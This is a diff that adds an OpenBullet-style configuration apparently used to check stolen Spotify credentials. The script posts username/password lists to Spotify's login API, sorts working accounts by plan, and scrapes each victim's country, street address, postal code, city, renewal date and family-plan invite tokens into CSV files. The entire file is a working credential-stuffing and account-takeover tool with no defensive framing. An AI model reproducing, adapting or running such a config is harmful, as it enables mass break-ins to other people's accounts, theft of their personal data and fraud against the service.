@@ -1,0 +1,191 @@
+[SETTINGS]
+{
+  "Name": "Spotify",
+  "SuggestedBots": 100,
+  "MaxCPM": 2000,
+  "LastModified": "2019-08-19T01:30:21.364804+02:00",
+  "AdditionalInfo": "Proxyless | Free / Premium (Paused) = Custom FREE | Premium, Students, Hulu & Family Member = Custom | Family Owner (+ Card about to expire / Payment failed / Normal) = Success | Captures: Family status, Invite links, Invites left, country, city, address, renewal date",
+  "Author": "sp6off",
+  "Version": "1.3.7 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#GET_Token REQUEST GET "https://accounts.spotify.com/en/login?continue=https:%2F%2Fwww.spotify.com%2Fuk%2Faccount%2Foverview%2F" EncodeContent=TRUE 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#POST_Login REQUEST POST "https://accounts.spotify.com/api/login" 
+  CONTENT "remember=true&username=<USER>&password=<PASS>&csrf_token=<COOKIES(csrf_token)>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "__bon: MHwwfC0xNDAxNTMwNDkzfC01ODg2NDI4MDcwNnwxfDF8MXwx" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Login_Check KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "InvalidCredentials" 
+  KEYCHAIN Success OR 
+    KEY "displayName" 
+
+#Capture_Username PARSE "<SOURCE>" LR "\"displayName\":\"" "\"," -> CAP "Username" 
+
+#GET_SubPage REQUEST GET "https://www.spotify.com/uk/account/overview/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Capture_Country PARSE "<SOURCE>" LR "'userCountry': '" "'" CreateEmpty=FALSE -> CAP "Country" 
+
+#Capture_Sub PARSE "<SOURCE>" LR "\"plan\":{\"name\":\"" "\"," -> VAR "SubscriptionCAP" 
+
+#Split_Subs KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<SubscriptionCAP>" EqualTo "Spotify Free" 
+  KEYCHAIN Success OR 
+    KEY "<SubscriptionCAP>" EqualTo "Premium for Family" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<SubscriptionCAP>" EqualTo "Spotify Premium" 
+    KEY "<SubscriptionCAP>" EqualTo "Spotify Premium Duo" 
+    KEY "<SubscriptionCAP>" EqualTo "Spotify Premium with Hulu" 
+    KEY "<SubscriptionCAP>" EqualTo "Premium for Students" 
+    KEY "<SubscriptionCAP>" EqualTo "Spotify Unlimited" 
+
+#Get_More_SubInfo REQUEST GET "https://www.spotify.com/uk/account/subscription/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+IF "<SOURCE>" Contains "family-plan-downgrading-to-premium"
+
+#Downgrade_Specify FUNCTION Replace "Premium for Family" "Family Owner (Downgrading)" "<SubscriptionCAP>" -> CAP "Subscription" 
+
+JUMP #Capture_Renewal
+ENDIF
+IF "<SOURCE>" Contains "ily</h3><div class=\"alert alert-danger alert-subscription\"><p><strong>Your subscription payment failed."
+
+#Payment_F_Specify FUNCTION Replace "Premium for Family" "Family Owner (Payment Failed)" "<SubscriptionCAP>" -> CAP "Subscription" 
+
+JUMP #Capture_Renewal
+ENDIF
+IF "<SOURCE>" Contains "ily</h3><div class=\"alert alert-warning alert-subscription\"><p><strong>Your card&#039;s about to expire."
+
+#Card_Expiring_Specify FUNCTION Replace "Premium for Family" "Family Owner (Card is about to expire)" "<SubscriptionCAP>" -> CAP "Subscription" 
+
+JUMP #Capture_Renewal
+ENDIF
+IF "<SOURCE>" Contains "You're a member of a family plan."
+
+#Fam_Member_Specify FUNCTION Replace "Premium for Family" "Family Member" "<SubscriptionCAP>" -> CAP "Subscription" 
+
+JUMP #HitSort
+ENDIF
+IF "<SOURCE>" Contains "Your last payment didn&#039;t work."
+
+#Premium_Paused_Specify FUNCTION Replace "Premium paused" "Spotify Premium (Paused)" "<SubscriptionCAP>" -> CAP "Subscription" 
+
+JUMP #Capture_Renewal
+ENDIF
+IF "<SOURCE>" Contains "data-ga-label=\"family-plan\" >Update</a></"
+
+#Owner_Specify FUNCTION Replace "Premium for Family" "Family Owner" "<SubscriptionCAP>" -> CAP "Subscription" 
+
+JUMP #Capture_Renewal
+ENDIF
+
+#Capture_Renewal PARSE "<SOURCE>" LR "<b class=\"recurring-date\">" "</b>" -> CAP "Renewal" 
+
+#HitSort KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<Subscription>" EqualTo "Spotify Premium (Paused)" 
+  KEYCHAIN Success OR 
+    KEY "<Subscription>" EqualTo "Family Owner" 
+    KEY "<Subscription>" EqualTo "Family Owner (Card is about to expire)" 
+    KEY "<Subscription>" EqualTo "Family Owner (Downgrading)" 
+    KEY "<Subscription>" EqualTo "Family Owner (Payment Failed)" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<Subscription>" EqualTo "Family Member" 
+
+#Save_Subs_To_File UTILITY File "Spotify_Hits\\<Subscription>\\Subscription.csv" AppendLines "<DATA>, <CountryCAP>, <Subscription>, <Address>, <PostalCode>, <City>" -> VAR "Get_All_Prem" 
+
+#GET_FamPage REQUEST GET "https://www.spotify.com/uk/family/api/get-family-plan/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#CleanFamData FUNCTION Unescape "<SOURCE>" -> VAR "famdata" 
+
+#Capture_Address PARSE "<famdata>" LR "\"line1\":\"" "\"}," CreateEmpty=FALSE -> CAP "Address" 
+
+#Capture_Postal_Code PARSE "<famdata>" LR "\"postalCode\":\"" "\"," CreateEmpty=FALSE -> CAP "PostalCode" 
+
+#Capture_City PARSE "<famdata>" LR "\"city\":\"" "\"," CreateEmpty=FALSE -> CAP "City" 
+
+#Calculate_Invites_Left FUNCTION CountOccurrences "username" "<famdata>" -> CAP "Invites done" 
+
+#Capture_Invites_Left FUNCTION Compute "(6-<Invites done>)+1" -> VAR "InvitesLeft" 
+
+#Fix_Invites_Left FUNCTION Translate 
+  KEY "0" VALUE "No invites left" 
+  KEY "1" VALUE "One invite left" 
+  KEY "2" VALUE "Two invites left" 
+  KEY "3" VALUE "Three invites left" 
+  KEY "4" VALUE "Four invites left" 
+  KEY "5" VALUE "Five invites left" 
+  KEY "6" VALUE "Six invites left" 
+  KEY "7" VALUE "Seven invites left" 
+  "<InvitesLeft>" -> CAP "Invites_Left" 
+
+#Capture_Invite_Links PARSE "<famdata>" JSON "invites" -> VAR "InviteList" 
+
+#Refine_Invite_Links FUNCTION Replace "com/fam" "com/<CountryCAP>/fam" "<InviteList>" -> VAR "InviteLinks" 
+
+#Store_Invite_LinkTokens PARSE "<InviteLinks>" JSON "redeemLink" Recursive=TRUE -> VAR "Invite_Tokens" 
+
+#Capture_Invite_LinkTokens FUNCTION Replace "[]" "None left or sent" "<Invite_Tokens>" -> CAP "InviteTokens" 
+
+#Save_To_File UTILITY File "Spotify_Hits\\Family Owner\\Tokens.csv" AppendLines "<Address>, <PostalCode>, <City>, <InviteTokens>" -> VAR "SaveAllTokens" 
+
